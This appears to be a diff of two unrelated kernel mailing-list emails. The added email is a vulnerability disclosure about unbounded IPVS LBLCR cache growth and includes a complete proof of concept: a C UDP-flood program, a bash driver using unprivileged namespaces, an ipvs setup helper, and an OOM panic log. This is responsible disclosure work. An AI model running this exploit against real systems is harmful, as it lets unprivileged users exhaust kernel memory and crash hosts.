@@ -1,131 +1,586 @@
-Received: from mail-wr1-f41.google.com (mail-wr1-f41.google.com [209.85.221.41])
+Received: from mail-pl1-f174.google.com (mail-pl1-f174.google.com [209.85.214.174])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3C87F395DAA
-	for <netfilter-devel@vger.kernel.org>; Sun, 16 Aug 2026 15:14:54 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.221.41
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4C80D3B7753
+	for <netfilter-devel@vger.kernel.org>; Sun, 16 Aug 2026 15:22:57 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.174
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1786893296; cv=none; b=DydLfIVkMGLo6Td91Hb7ThKvIHC4CmqxCOZVH+qw+ppnhZ/21t/c4jN/WDYJl23pasUpq5rSqnOPkiDqng3rNuE7uyOBRHBBtsk+0D1dqcni5Cjlje233nVsQoem9AIn4NuU/ze0YrcVfj5VD8+I9HBuAK0z4lReR8tPo3JpQX8=
+	t=1786893779; cv=none; b=NhK+tEOfn7sziLlvfIhGIzqgEajjIzeyaIO65UyVSxcxt0rYPYRbJ6Y0ay2xnGSdBTLiDU33uXxoGlFTZ2irOQ/jyD0h9Fl5sANvlrNvgDBy9VTuRRlR4srpsqb8cNYBXmU7Ibj3HVt7gOSQk0QXhpHGYQvXBINn+rqTHb015+E=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1786893296; c=relaxed/simple;
-	bh=oHad1wyox8qdDpY81HM8XfWbSH7UCwe0GLxzkyCErM4=;
-	h=Date:From:To:Cc:Subject:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=XZ2DxnzHoC+GOc2OiZm5oporWfV6pky4Rhwy4eYjzkFK/QF8YRmMaNeq1O5efL2YczPQaDaHr5EF2M8lnPVMyWtZwzUNbu2cpZ7WkUkKYPvK1RTX/ZIx8gR6ktPE+8BYVpqH/vwFKR4tShXkjPZ4IhLDN/NrJTrnvXMoX1w6nAM=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=bfv+1QI4; arc=none smtp.client-ip=209.85.221.41
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1786893779; c=relaxed/simple;
+	bh=Ck8cfJlYZb9aSKdPp26JSjdrSaYHP5cw8nHqZEiTwtg=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=crFWrw3jyVaZPJmnpmaTg+ukMgnxqoQXNKQoomoYkJvtMeBz4c/BNh3AkoEUTXuyojKdZdrBz1iNSNEWWnvXtHTIDCP59iNhPwA+w6FX3Y2ogYJC7fzUo9EH5LCnfldWNBtOlv20/8yp/vUF2SJgSFiO9Qe2+DoJVtQXFw78o30=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=NLKH2sii; arc=none smtp.client-ip=209.85.214.174
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="bfv+1QI4"
-Received: by mail-wr1-f41.google.com with SMTP id ffacd0b85a97d-47f703a9e5dso1156550f8f.0
-        for <netfilter-devel@vger.kernel.org>; Sun, 16 Aug 2026 08:14:54 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="NLKH2sii"
+Received: by mail-pl1-f174.google.com with SMTP id d9443c01a7336-2d02b4c3601so28272985ad.3
+        for <netfilter-devel@vger.kernel.org>; Sun, 16 Aug 2026 08:22:57 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1786893292; x=1787498092; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:mime-version:references
-         :in-reply-to:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=oDn1zkAJTAhRzfQXoiRfUNpmt/wvhx4bAoFeaZmIx14=;
-        b=bfv+1QI4UV37TIKxa1TGhmFpcxlnBRLXA3kdutOATbmkmxGlaVPInNN7+AJ/aywRBQ
-         h9zunZb2XN2eK5jSWcZMZHo+tM0A+Yw5gYyjr8hCuzt9kWLFxsz2ATY7un6PO4sJz23t
-         d2wFNByaLUh9s7W+1mi3dLFSnBjbwvrElqjBnA8V06L/SrfPaujtc10tRlb/F4Fkr9F2
-         de3HaQM1KhFuBk6SxL8tgAK1zbxOaRb8Apqu8xo28DVJpHVHPE7F/+d9m+wKMhhbsFYq
-         05Lh0y89uoNWSLMI+tv9hquMOn6QEJp4+fqoo00S+gb5yrTY7+nx1JNnYYM3CCAoJXem
-         /Nkg==
+        d=nebusec.ai; s=google; t=1786893776; x=1787498576; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=pLdhfmMualfVVCOCxE5GSRIkyXdm8EZo7zQ2e3RYq8c=;
+        b=NLKH2siiFIdHXto0Hym/mbv9eksHfyRnJvzrwFSXnaCOAbW72WgMEAN6TcfGg2Fvur
+         Laj1uDXw/TdfrOJ6+66K2WqNbQN2yqLPWhhDzHFPzckbskppqgz5PZijhX+cg/oIeu2H
+         3szp76o32nTKv2MzjQDLBRDkqmk0jPeEtlu8jv+01hG0aZSiCpXyTRtdGUuwAmHPeCmR
+         g2I8uv3KSd2YJcxIno45vkBm+FfdOU/e7Cm53Z20Mc1IVnQhfyVUBV5K9e5ca1j3ZwbE
+         yfyqhOW2TxUZeuiGX5Vpfa6sM4IC5YO0QAyh6XwfeDtBts6snK0ckLbdLrH0mPP43vEu
+         dqzg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1786893292; x=1787498092;
-        h=content-transfer-encoding:content-type:mime-version:references
-         :in-reply-to:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=oDn1zkAJTAhRzfQXoiRfUNpmt/wvhx4bAoFeaZmIx14=;
-        b=KATGrS0Ki9ZkL4fO4WW0H8pLQVPyzJDtQzG4lmX/2T45fifl+yonniG9ncCxn8x2Bl
-         oFNTDzMM2sXSKJE8crbs02NVODpkJrJvkniSuIfXjA0hXdU8AANEwskbhYAKgeVx3EAL
-         yfHDnFrs4WS3ukTni5ky4d6/OuCUFiO7BD9F72mN4UQwUOnoucvAZcUaroQvR8bJVBRq
-         PAUI2XfaxuSehpb8X63+32j09bQxEUaPa3TfXgwc6YTjgVUPwNpCiJ2fwiIbXJZ9mE4u
-         +hvauwGXrwIU1VZkT23XblQU0F33IIT2jWahymT4JeoKc9McG43k728YMmd5tTlYS/+u
-         pYig==
-X-Forwarded-Encrypted: i=1; AHgh+Rqvlc/AH4kMeCLof24kbAw/Ju99GvIFjagUFBHBi4UobN+jFz8nBwNjpso/wYVWwVnXJYDaL3Pho2AsDfqb8sE=@vger.kernel.org
-X-Gm-Message-State: AOJu0YyEO7UHpExcnk01c7xCcJG5hZQXHH7Ebczy87FMqAGgwDgmaZEP
-	cWHdJOCmP1HLO/M01+znHA4SXXEsJ4ODCCswhl4pPDe/ZRKDem8GWEtcbuPY9xS3
-X-Gm-Gg: AR+sD13q3esEC9th6PR0a+YfUQJuUEnPZVuYQFEOQ9R/0L2Bll6+9U/5KKeqDql6Xdq
-	whIbG3Wf6dqyOp7ufTPHz+5ehgtWeqsFhY4Uu4mPP5NnjPUT4PiY15PXJK6IqrStBE2FKMoz46W
-	x5BLkesg2MoaL8kk25vzwVicaR7cxr+o1ghC2XruGGBxroEVbyxb/IfRHS0m8X/tjNZFMLbhbk3
-	CA18s+LdzgsEmygrbEoxGOn99Y/rZB+1BpZGboKw05BfompjZ8hwhEUzDbwBStlLdV3oR9WawyO
-	GgT0R4RswYlenOBGZlh0oG1k7ES4LlQ+SlJXrAyaYKgEwEYdjc+8QwtLMrUbAiCqh/ueXRPF8Wz
-	+zL/5kQfOIBFLx+wT3eX+evO8JsJp+8EXBVe9do03tp2qRdpHW3oGu7MxuhMpIkc7wfBg9Q/uQF
-	ECJMCQZ1SZUjwfLLWLKp8xlGCQe2bMVEpsLL4PjycXSZEdaJ6HF++abuDP8gqeoPQyPWrk4E4Zk
-	mRtzIC47m5dXZSlQA0Os9pocw==
-X-Received: by 2002:a05:600c:6a10:b0:499:79ba:a754 with SMTP id 5b1f17b1804b1-49987973094mr241171505e9.11.1786893292329;
-        Sun, 16 Aug 2026 08:14:52 -0700 (PDT)
-Received: from pumpkin (82-69-66-36.dsl.in-addr.zen.co.uk. [82.69.66.36])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-49987b2a176sm223938615e9.4.2026.08.16.08.14.51
+        d=1e100.net; s=20251104; t=1786893776; x=1787498576;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=pLdhfmMualfVVCOCxE5GSRIkyXdm8EZo7zQ2e3RYq8c=;
+        b=ILIpS2RGhtnU/oJBGp/f5JCSWByubP0qQytmGFDm+39Q3iqheT/ZKe25d8Mguv07Ws
+         EmVVThucmQuQ8rthNHtUVPs2yAcvFTtMV89gs2TSIWy9VMuWQVCKgettrPiw0MFi6D+f
+         8dO/qdCQw2OOfKONxos6Qg6OchxtFlRMgdqFA9P6jVQF6pol9eu0VwiCffaD9fFUOVvU
+         hlkx3Lk0voW3FCqNAfcqCSr8Tq8GTt0wzGdMcqAheFheeEuzctJOfPivSyWXCHKNCOh6
+         F7ECAvhQNBvvIOxDUDzHOSPskK95shnH/s+XZHDGLVCDsjV89QKkoaTRHks/6o1bV3qV
+         En8w==
+X-Forwarded-Encrypted: i=1; AHgh+RqL0C7kgyXQnvH9UO29bV4qUE99KI8uIxmXcP6pgXdys/BgFIwLIkbAQz3TFo4Iu6YTTdJ30GkdJvPrrHZ9TOA=@vger.kernel.org
+X-Gm-Message-State: AOJu0YxoR0hdbiwiDtalcRD8AvGzDo1nt7ibPkntY4A8EfBgwFQ9qy2L
+	5Ka/RliOd40AiXK/IpIShOcxuJMj4ccafJhP5af5WuIwgKeAJuwDSm161VJani3d+vWK
+X-Gm-Gg: AR+sD10sN6EyOAwJSp0OSVsosAhUr/flBlsUy91lyZdnoeh7xVYESuqvAlpApsdQMrW
+	r7f3YM+rBYrQ6iwoa1ZI6WUBU8Pi0f56jasHO/snyWtYHSak7ddzIGFLoOegQetpx0HwiA0oJC5
+	F8By36RSUxWf9QJ3yr7QEej+fCIpHrynZFVVi+mHtThdKHQZtyY7BjlUQdopWh1DA6H87hYOn0H
+	dadyvani/auk3XjqYFybWkYsv2l/qzusbXpyv8hYmQJCbRZBLN4zQJrNWVrMfo43+MvrArDeOGF
+	vwuk68WaiqiyP05n3yiJanlSDUkWZVI9N0oq1Dfm6yf5z5vbDoDbDfKkis+rT2YaMN4bXsVghIC
+	TibOqXA4HNiJ9MLyaJuxIq87Z/hFlTGCNJdLpV9uNISOCAIaop1dtPMPZMBGlv5WkclQXE+sMdu
+	PSoZ8TmWkbJCbMS0hnv9GbuBtmC9EbnnFdecn1jDJrwTFyoMDcJz1SBaECh42vX2H3N8BgUL9+Z
+	qZJfnE=
+X-Received: by 2002:a17:903:950:b0:2c9:9a2e:dab0 with SMTP id d9443c01a7336-2d3b0827064mr221541655ad.3.1786893776144;
+        Sun, 16 Aug 2026 08:22:56 -0700 (PDT)
+Received: from Roxy.localdomain ([2602:feda:30:ae86:216:b3ff:fe40:dc4])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-320e9df03d4sm24352629eec.15.2026.08.16.08.22.52
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sun, 16 Aug 2026 08:14:52 -0700 (PDT)
-Date: Sun, 16 Aug 2026 16:14:50 +0100
-From: David Laight <david.laight.linux@gmail.com>
-To: Eric Biggers <ebiggers@kernel.org>
-Cc: x86@kernel.org, linux-kernel@vger.kernel.org,
- linux-raid@vger.kernel.org, Christoph Hellwig <hch@infradead.org>,
- linux-crypto@vger.kernel.org, Herbert Xu <herbert@gondor.apana.org.au>,
- Taehee Yoo <ap420073@gmail.com>, netfilter-devel@vger.kernel.org, Pablo
- Neira Ayuso <pablo@netfilter.org>, Florian Westphal <fw@strlen.de>, Phil
- Sutter <phil@nwl.cc>
-Subject: Re: [PATCH 0/6] x86: add missing vzeroupper instructions
-Message-ID: <20260816161450.05fd24f2@pumpkin>
-In-Reply-To: <20260815205750.169336-1-ebiggers@kernel.org>
-References: <20260815205750.169336-1-ebiggers@kernel.org>
-X-Mailer: Claws Mail 4.1.1 (GTK 3.24.38; arm-unknown-linux-gnueabihf)
+        Sun, 16 Aug 2026 08:22:54 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: lvs-devel@vger.kernel.org,
+	netfilter-devel@vger.kernel.org
+Cc: horms@verge.net.au,
+	ja@ssi.bg,
+	pablo@netfilter.org,
+	fw@strlen.de,
+	phil@nwl.cc,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH nf 0/1] ipvs: bound LBLCR cache growth
+Date: Sun, 16 Aug 2026 23:22:12 +0800
+Message-ID: <cover.1786884824.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: netfilter-devel@vger.kernel.org
 List-Id: <netfilter-devel.vger.kernel.org>
 List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 
-On Sat, 15 Aug 2026 13:57:44 -0700
-Eric Biggers <ebiggers@kernel.org> wrote:
+Hi Linux kernel maintainers,
 
-> Assembly code using YMM or ZMM registers is supposed to end with the
-> vzeroupper instruction in order to avoid degrading the performance of
-> any later SSE code.  Since this only affects performance and not
-> correctness, it is sometimes overlooked.  Most kernel code does it
-> correctly, but a few cases were missed.  This series fixes them.
-> 
-> It should be easiest to take the full series through the x86 tree.
+We found and validated an issue in net/netfilter/ipvs/ip_vs_lblcr.c.
+The bug is reachable by a non-root user through a new user and network
+namespace.
 
-Would it be better to an an unconditional vzeroupper in kernel_fpu_end()?
-It could go in kernel_fpu_start() but that might have a bigger effect
-on latency.
-(I assume there is one in kernel_fpu_start() if it actually saves
-the user registers?)
+We will provide detailed information about the bug in this email,
+along with a PoC to trigger it.
 
-Looking the latency/uops seems reasonably on everything 'recent' except
-zen-1 and knights-landing.
-Although the microcode patch for zen-2 might make that a lot worse.
+---- details below ----
 
-	David  
+Bug details:
 
+ip_vs_lblcr_new() allocates and publishes an LBLCR cache entry for
+every previously unseen destination address. Although tbl->max_size is
+initialized to 16384 entries, it is only used by the periodic collector
+after cache growth has already exceeded the limit. The collector runs
+once per minute and does not reclaim recently used entries.
 
-> 
-> Eric Biggers (6):
->   xor: add missing vzeroupper to AVX code
->   raid6: add missing vzeroupper to AVX2 code
->   raid6: add missing vzeroupper to AVX-512 code
->   crypto: x86/aria - add missing vzeroupper in AVX2 code
->   crypto: x86/aria - add missing vzeroupper in AVX-512 code
->   netfilter: nft_set_pipapo_avx2: add missing vzeroupper
-> 
->  arch/x86/crypto/aria-aesni-avx2-asm_64.S  |  6 ++++++
->  arch/x86/crypto/aria-gfni-avx512-asm_64.S |  3 +++
->  lib/raid/raid6/x86/avx2.c                 |  6 ++++++
->  lib/raid/raid6/x86/avx512.c               |  6 ++++++
->  lib/raid/raid6/x86/recov_avx2.c           |  2 ++
->  lib/raid/raid6/x86/recov_avx512.c         |  2 ++
->  lib/raid/xor/x86/xor-avx.c                |  1 +
->  net/netfilter/nft_set_pipapo_avx2.c       | 17 ++++++++---------
->  8 files changed, 34 insertions(+), 9 deletions(-)
-> 
-> 
-> base-commit: db2ddb87143519e20a95aa36c60b36107b736a58
+An attacker can configure a fwmark-based LBLCR service and
+continuously send UDP packets to distinct destination addresses. Each
+new address creates an entry, allowing the table to grow without bound.
+The allocations use GFP_ATOMIC and are not charged to the originating
+socket or memory cgroup.
 
+The scheduler selects a destination before attempting to cache it and
+already continues to use that destination when cache creation fails.
+The fix therefore rejects only new cache entries after tbl->max_size has
+been reached, while normal traffic to new addresses remains serviceable
+without further cache growth.
+
+Reproducer:
+
+    make
+    TRACE=0 ./poc.sh ns 1000 2 9001
+
+The command above demonstrates reachability from an unprivileged user
+through unshare -Urn. The captured OOM log was produced with:
+
+    sysctl -w vm.panic_on_oom=2
+    TRACE=0 ./poc.sh root 300000 16 9000
+
+------BEGIN poc.c------
+
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <pthread.h>
+#include <stdatomic.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <time.h>
+#include <unistd.h>
+
+struct worker_ctx {
+	unsigned long start;
+	unsigned long step;
+	unsigned long count;
+	uint16_t dport;
+};
+
+static atomic_ulong g_sent;
+static atomic_ulong g_errors;
+
+static void idx_to_addr(unsigned long idx, struct in_addr *addr)
+{
+	uint32_t octet0 = 198U + ((idx >> 24) & 1U);
+	uint32_t octet1 = (idx >> 16) & 0xffU;
+	uint32_t octet2 = (idx >> 8) & 0xffU;
+	uint32_t octet3 = idx & 0xffU;
+	uint32_t host = (octet0 << 24) | (octet1 << 16) | (octet2 << 8) | octet3;
+
+	addr->s_addr = htonl(host);
+}
+
+static void *worker_main(void *arg)
+{
+	struct worker_ctx *ctx = arg;
+	int fd;
+	struct sockaddr_in sa;
+	char payload = 'X';
+	unsigned long i;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0) {
+		perror("socket");
+		return NULL;
+	}
+
+	memset(&sa, 0, sizeof(sa));
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(ctx->dport);
+
+	for (i = ctx->start; i < ctx->count; i += ctx->step) {
+		unsigned long sent;
+
+		idx_to_addr(i, &sa.sin_addr);
+		if (sendto(fd, &payload, sizeof(payload), 0,
+			   (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+			atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
+			continue;
+		}
+
+		sent = atomic_fetch_add_explicit(&g_sent, 1, memory_order_relaxed) + 1;
+		if ((sent % 100000UL) == 0) {
+			fprintf(stderr, "sent=%lu errors=%lu\n", sent,
+				atomic_load_explicit(&g_errors, memory_order_relaxed));
+		}
+	}
+
+	close(fd);
+	return NULL;
+}
+
+static unsigned long parse_ul(const char *s, const char *what)
+{
+	char *end = NULL;
+	unsigned long v;
+
+	errno = 0;
+	v = strtoul(s, &end, 0);
+	if (errno || !end || *end != '\0') {
+		fprintf(stderr, "invalid %s: %s\n", what, s);
+		exit(2);
+	}
+	return v;
+}
+
+int main(int argc, char **argv)
+{
+	struct timespec ts0, ts1;
+	pthread_t *threads;
+	struct worker_ctx *ctxs;
+	unsigned long count, workers, i;
+	uint16_t dport = 5555;
+	double elapsed;
+
+	if (argc < 2 || argc > 4) {
+		fprintf(stderr, "usage: %s <count> [workers] [dport]\n", argv[0]);
+		return 2;
+	}
+
+	count = parse_ul(argv[1], "count");
+	workers = (argc >= 3) ? parse_ul(argv[2], "workers") : 4;
+	if (workers == 0)
+		workers = 1;
+	if (argc >= 4) {
+		unsigned long port = parse_ul(argv[3], "dport");
+		if (port > 65535) {
+			fprintf(stderr, "invalid dport: %lu\n", port);
+			return 2;
+		}
+		dport = (uint16_t)port;
+	}
+
+	threads = calloc(workers, sizeof(*threads));
+	ctxs = calloc(workers, sizeof(*ctxs));
+	if (!threads || !ctxs) {
+		perror("calloc");
+		return 1;
+	}
+
+	clock_gettime(CLOCK_MONOTONIC, &ts0);
+
+	for (i = 0; i < workers; i++) {
+		ctxs[i].start = i;
+		ctxs[i].step = workers;
+		ctxs[i].count = count;
+		ctxs[i].dport = dport;
+		if (pthread_create(&threads[i], NULL, worker_main, &ctxs[i]) != 0) {
+			perror("pthread_create");
+			return 1;
+		}
+	}
+
+	for (i = 0; i < workers; i++)
+		pthread_join(threads[i], NULL);
+
+	clock_gettime(CLOCK_MONOTONIC, &ts1);
+	elapsed = (double)(ts1.tv_sec - ts0.tv_sec) +
+		  (double)(ts1.tv_nsec - ts0.tv_nsec) / 1000000000.0;
+
+	printf("done sent=%lu errors=%lu elapsed=%.2f sec rate=%.2f pkt/sec\n",
+	       atomic_load_explicit(&g_sent, memory_order_relaxed),
+	       atomic_load_explicit(&g_errors, memory_order_relaxed),
+	       elapsed,
+	       elapsed > 0.0 ?
+		 (double)atomic_load_explicit(&g_sent, memory_order_relaxed) / elapsed :
+		 0.0);
+
+	free(ctxs);
+	free(threads);
+	return 0;
+}
+
+------END poc.c--------
+
+------BEGIN poc.sh------
+
+#!/bin/bash
+set -euo pipefail
+
+PATH=/usr/sbin:/usr/bin:/sbin:/bin
+
+MODE="${1:-root}"
+COUNT="${2:-17000}"
+WORKERS="${3:-4}"
+PORT="${4:-9000}"
+MARK="${MARK:-123}"
+TRACE="${TRACE:-1}"
+PANIC_ON_OOM="${PANIC_ON_OOM:-0}"
+
+SCRIPT_DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
+BIN="${SCRIPT_DIR}/poc"
+IPVS_CTL="${SCRIPT_DIR}/ipvs_sockopt_ctl"
+TRACE_DIR=/sys/kernel/tracing
+
+usage() {
+	echo "usage: $0 [root|ns] [count] [workers] [real_server_port]" >&2
+}
+
+cleanup_trace() {
+	if [[ -d "${TRACE_DIR}/events/kprobes" ]]; then
+		for e in "${TRACE_DIR}"/events/kprobes/*/enable; do
+			[[ -e "$e" ]] && echo 0 > "$e" || true
+		done
+		echo > "${TRACE_DIR}/kprobe_events" || true
+	fi
+}
+
+start_trace() {
+	[[ "${TRACE}" == "1" ]] || return 0
+	mount -t tracefs tracefs "${TRACE_DIR}" 2>/dev/null || true
+	cleanup_trace
+	echo 0 > "${TRACE_DIR}/tracing_on"
+	echo > "${TRACE_DIR}/trace"
+	echo 'r:lblcr_ret ip_vs_lblcr_schedule entries=+8208(+520($arg1)):u32 max=+8212(+520($arg1)):u32' > "${TRACE_DIR}/kprobe_events"
+	echo 'entries >= 16380' > "${TRACE_DIR}/events/kprobes/lblcr_ret/filter"
+	echo 1 > "${TRACE_DIR}/events/kprobes/lblcr_ret/enable"
+	echo 1 > "${TRACE_DIR}/tracing_on"
+}
+
+dump_trace() {
+	[[ "${TRACE}" == "1" ]] || return 0
+	echo 0 > "${TRACE_DIR}/tracing_on" || true
+	echo "== trace tail =="
+	grep lblcr_ret "${TRACE_DIR}/trace" | tail -10 || true
+}
+
+start_udp_sink() {
+	python3 - "$PORT" <<'PY' &
+import socket
+import sys
+
+port = int(sys.argv[1])
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind(("127.0.0.1", port))
+while True:
+    s.recvfrom(2048)
+PY
+	SINK_PID=$!
+	trap 'kill ${SINK_PID} 2>/dev/null || true; cleanup_trace' EXIT
+}
+
+build_poc() {
+	if [[ "${IN_NS:-0}" == "1" ]]; then
+		make -C "${SCRIPT_DIR}" clean all
+	else
+		make -C "${SCRIPT_DIR}" clean poc
+	fi
+}
+
+setup_root_netns() {
+	ip link set lo up
+	iptables -t mangle -F OUTPUT || true
+	iptables -t mangle -A OUTPUT -p udp -j MARK --set-mark "${MARK}"
+	ipvsadm -C || true
+	ipvsadm -A -f "${MARK}" -s lblcr
+	ipvsadm -a -f "${MARK}" -r "127.0.0.1:${PORT}" -m -w 1
+}
+
+setup_unshared_netns() {
+	ip link set lo up
+	ip route add default dev lo
+	iptables -t mangle -F OUTPUT || true
+	iptables -t mangle -A OUTPUT -p udp -j MARK --set-mark "${MARK}"
+	"${IPVS_CTL}" setup "${MARK}" "${PORT}"
+}
+
+run_flood() {
+	"${BIN}" "${COUNT}" "${WORKERS}" 5555
+}
+
+show_state() {
+	echo "== ipvs service =="
+	ipvsadm -Ln --stats --exact || true
+	echo "== connection count =="
+	if [[ -r /proc/net/ip_vs_conn ]]; then
+		tail -n +2 /proc/net/ip_vs_conn | wc -l
+	fi
+}
+
+if [[ "${MODE}" == "ns" && "${IN_NS:-0}" != "1" ]]; then
+	exec unshare -Urn env IN_NS=1 PATH="${PATH}" MARK="${MARK}" TRACE="${TRACE}" \
+		PANIC_ON_OOM="${PANIC_ON_OOM}" "$0" root "${COUNT}" "${WORKERS}" "${PORT}"
+fi
+
+if [[ "${MODE}" != "root" && "${MODE}" != "ns" ]]; then
+	usage
+	exit 2
+fi
+
+if [[ "${EUID}" -ne 0 ]]; then
+	echo "run as root, or use mode 'ns' from an unprivileged account" >&2
+	exit 2
+fi
+
+if [[ "${PANIC_ON_OOM}" == "1" ]]; then
+	sysctl -w vm.panic_on_oom=2
+fi
+
+build_poc
+start_udp_sink
+start_trace
+if [[ "${IN_NS:-0}" == "1" ]]; then
+	setup_unshared_netns
+else
+	setup_root_netns
+fi
+run_flood
+show_state
+dump_trace
+
+------END poc.sh--------
+
+------BEGIN ipvs_sockopt_ctl.c------
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/ip_vs.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+struct ip_vs_svcdest_user {
+	struct ip_vs_service_user s;
+	struct ip_vs_dest_user d;
+};
+
+static int ipvs_fd(void)
+{
+	int fd = socket(AF_INET, SOCK_STREAM, 0);
+	if (fd < 0)
+		perror("socket");
+	return fd;
+}
+
+static int do_flush(int fd)
+{
+	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_FLUSH, NULL, 0);
+}
+
+static int do_add_service(int fd, unsigned fwmark)
+{
+	struct ip_vs_service_user svc;
+
+	memset(&svc, 0, sizeof(svc));
+	svc.protocol = IPPROTO_UDP;
+	svc.fwmark = fwmark;
+	strncpy(svc.sched_name, "lblcr", sizeof(svc.sched_name) - 1);
+	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADD, &svc, sizeof(svc));
+}
+
+static int do_add_dest(int fd, unsigned fwmark, unsigned short port)
+{
+	struct ip_vs_svcdest_user arg;
+
+	memset(&arg, 0, sizeof(arg));
+	arg.s.protocol = IPPROTO_UDP;
+	arg.s.fwmark = fwmark;
+	arg.d.addr = htonl(INADDR_LOOPBACK);
+	arg.d.port = htons(port);
+	arg.d.conn_flags = IP_VS_CONN_F_MASQ;
+	arg.d.weight = 1;
+	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADDDEST, &arg, sizeof(arg));
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr, "usage: %s flush | setup <fwmark> <real_server_port>\n", prog);
+}
+
+int main(int argc, char **argv)
+{
+	int fd, rc;
+
+	if (argc < 2) {
+		usage(argv[0]);
+		return 2;
+	}
+
+	fd = ipvs_fd();
+	if (fd < 0)
+		return 1;
+
+	if (strcmp(argv[1], "flush") == 0) {
+		rc = do_flush(fd);
+	} else if (strcmp(argv[1], "setup") == 0 && argc == 4) {
+		unsigned fwmark = strtoul(argv[2], NULL, 0);
+		unsigned port = strtoul(argv[3], NULL, 0);
+		if (port > 65535) {
+			fprintf(stderr, "bad port: %u\n", port);
+			close(fd);
+			return 2;
+		}
+		rc = do_flush(fd);
+		if (rc == 0)
+			rc = do_add_service(fd, fwmark);
+		if (rc == 0)
+			rc = do_add_dest(fd, fwmark, (unsigned short)port);
+	} else {
+		usage(argv[0]);
+		close(fd);
+		return 2;
+	}
+
+	if (rc < 0) {
+		perror("setsockopt");
+		close(fd);
+		return 1;
+	}
+
+	close(fd);
+	return 0;
+}
+
+------END ipvs_sockopt_ctl.c--------
+
+----BEGIN crash log----
+
+[  442.212292][ T9063] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
+[  442.212990][ T9063] CPU: 3 UID: 0 PID: 9063 Comm: rasdaemon Not tainted 6.12.95 #2
+[  442.213508][ T9063] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  442.214343][ T9063] Call Trace:
+[  442.214610][ T9063]  <TASK>
+[  442.214836][ T9063]  panic+0x533/0x610
+[  442.215122][ T9063]  ? dump_header+0x5d2/0x800
+[  442.215437][ T9063]  ? __pfx_panic+0x10/0x10
+[  442.215769][ T9063]  out_of_memory+0x73c/0x1430
